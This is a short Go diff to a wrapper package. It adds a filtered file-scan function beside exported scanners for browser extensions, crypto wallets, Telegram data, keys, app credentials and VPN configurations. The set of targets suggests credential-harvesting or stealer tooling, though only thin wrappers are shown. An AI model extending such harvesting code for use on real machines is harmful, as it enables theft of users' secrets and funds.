@@ -38,9 +38,16 @@ type WireGuardResult = types.WireGuardResult
 type OpenVPNResult = types.OpenVPNResult
 type MullvadResult = types.MullvadResult
 
-func ScanExtensions() []ExtensionResult       { return scanner.ScanExtensions() }
-func ScanFiles() []FileResult                 { return scanner.ScanFiles() }
-func ScanWallets() []WalletResult             { return scanner.ScanWallets() }
+func ScanExtensions() []ExtensionResult { return scanner.ScanExtensions() }
+func ScanFiles() []FileResult           { return scanner.ScanFiles() }
+
+type FileScanFilter = scanner.FileScanFilter
+
+func ScanFilesFiltered(filter *FileScanFilter) []FileResult {
+	return scanner.ScanFilesFiltered(filter)
+}
+
+func ScanWallets() []WalletResult { return scanner.ScanWallets() }
 func ScanTelegram() []TelegramResult          { return scanner.ScanTelegram() }
 func ScanKeys() []KeyResult                   { return scanner.ScanKeys() }
 func ScanApps() []AppCredentialResult         { return scanner.ScanApps() }
